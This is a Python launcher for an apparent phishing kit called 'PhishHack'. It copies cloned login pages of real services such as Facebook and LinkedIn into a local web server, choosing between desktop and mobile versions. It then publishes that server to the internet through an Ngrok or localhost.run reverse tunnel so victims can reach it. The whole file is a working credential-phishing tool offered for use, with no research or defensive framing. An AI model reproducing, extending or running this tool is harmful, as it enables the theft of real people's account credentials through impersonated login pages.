import sys, socket
import subprocess
import pkg_resources
import getpass

def is_connected():
    try:
        host = socket.gethostbyname("1.1.1.1")
        s = socket.create_connection((host, 80), 2)
        s.close()
        return True
    except:
        pass
    return False


if is_connected():
    requirements = set()

    with open("requirements.txt") as f:
        for line in f:
            requirements.add(line.replace("\n", ""))

    installed = {pkg.key for pkg in pkg_resources.working_set}
    missing = requirements - installed

    if missing:
        print(
            "Checking for required modules.\nIt'll install automatically if any modules are not installed..."
        )
        python = sys.executable
        subprocess.check_call(
            [python, "-m", "pip", "install", *missing], stdout=subprocess.DEVNULL
        )
else:
    print(
        "Some modules are not installed.\nPlease install from requirements.txt or connect with internet to auto install."
    )

try:
    import os, shutil, argparse, sys, itertools
    from multiprocessing import Process
    sys.path.append("./server/")
    from banner import *

    os.system("cls" if os.name == "nt" else "clear")

    def pre_site():
        if not os.path.isdir("./server/templates"):
            os.mkdir("./server/templates")
        else:
            shutil.rmtree("./server/templates/")

    def SitePath():
        return "./site/mob/" if device != "pc" else "./site/pc/"

    def copy(site):
        try:
            shutil.copytree(
                f"{SitePath()}{site}", "./server/templates/", dirs_exist_ok=True
            )
        except:
            print("Site page not found!!")

    def sites(type):
        _site = []
        for i in [f.path for f in os.scandir(f"./site/{type}/") if f.is_dir()]:
            _site.append(i.replace(f"./site/{type}/", ""))
        return str(_site).replace("[", "").replace("]", "").replace("'", "")

    if __name__ == "__main__":
        # Getting arguments
        parser = argparse.ArgumentParser(
            description=f"Available Sites for mobile :- {sites('mob')} \n | Available Sites for desktop :- {sites('pc')} ",
            usage="%(prog)s [options]",
        )

        parser.add_argument(
            "-s",
            metavar="Site name",
            default="facebook",
            type=str,
            help=" facebook / linkedin /... | default = facebook",
        )
        parser.add_argument(
            "-p", metavar="Port number", default=8080, type=int, help=" default = 8080"
        )
        parser.add_argument(
            "-d",
            metavar="Device name",
            default="pc",
            type=str,
            help=" pc / mob | default = pc",
        )

        # assigning values according to aruments
        args = parser.parse_args()

        site = args.s
        port = args.p
        device = args.d
        if len(sys.argv) > 1:
            # Copy webpage to server
            pre_site()
            copy(site)

            # Running server
            os.system(f"python3 ./server/httpServer.py -p {port}")
        else:
            device = "pc"
            site = "facebook"
            port = 8080
            PrintBanner()

            # Choosing device name
            try:
                print("Please choose device (default = PC):\n[1] PC \n[2] MOBILE")
                _device = int(input("\nEnter here :"))
                if _device is not None:
                    if _device == 1:
                        device = "pc"
                    elif _device == 2:
                        device = "mob"
                    else:
                        print(
                            "Opps!!! You entred wrong key.\nI am taking default value"
                        )
            except KeyboardInterrupt:
                sys.exit("\n\nThanks for using PhishHack.\nSee you later......")
            except:
                pass
            # Choosing site name
            try:
                print("\n\nPlease choose website name (default = facebook):")
                _site = sites(device).split(", ")
                for i in range(len(_site)):
                    print(f"[{i+1}] {_site[i]}")
                _siteInpt = int(input("\nEnter here :"))
                if _site is not None and _siteInpt <= len(_site):
                    site = _site[_siteInpt - 1]
                else:
                    print("Opps!!! You entred wrong key.\nI am taking default value")
            except KeyboardInterrupt:
                sys.exit("\n\nThanks for using PhishHack.\nSee you later......")
            except:
                pass
            # Choosing port number
            try:
                _port = int(input("\n\nPlease enter port number (default = 8080): "))
                if _port is not None:
                    port = _port
            except KeyboardInterrupt:
                sys.exit("\n\nThanks for using PhishHack.\nSee you later......")
            except:
                pass


            def ngrok_auth():
                if os.name == 'posix':
                    return os.path.isfile('/home/'+getpass.getuser()+'/.ngrok2/ngrok.yml')
                else:
                    return os.path.isfile('C:\\Users\\'+getpass.getuser()+'\\.ngrok2\\ngrok.yml')

            # Choosing tunnel option
            try:
                tunnel = int(input("\n\nPlease any tunnel service: \n[1] Ngrok\n[2] Localhost.run\n\nEnter here: "))
                if tunnel == 1:
                    os.remove("./localhost.run")
                    if not (ngrok_auth()):
                        token = input("Enter your auth-token: ")
                        if token:
                            ngrok.set_auth_token(token)
                        else:
                            sys.exit("\nEnter your ngrok auth-token")   
                elif tunnel == 2:
                    def l_run():
                        cmd = os.popen(f'ssh -o StrictHostKeyChecking=accept-new -o LogLevel=error -R 80:localhost:{port} nokey@localhost.run').readline   
                        for line in iter(cmd, ''):  
                            with open("localhost.run","a") as f:
                                f.write(line)
                    Process(target=l_run).start()
                              
                else:
                    sys.exit("\nPlease choose a valid number.")        
            except KeyboardInterrupt:
                sys.exit("\n\nThanks for using PhishHack.\nSee you later......")
            except:
                pass
            print("\n\nPlease wait.....")

            # Copy webpage to server
            pre_site()
            copy(site)

            # Running server
            os.system(f"python3 ./server/httpServer.py -p {port}")

except KeyboardInterrupt:
    print("\n\nThanks for using PhishHack.\nSee you later......")
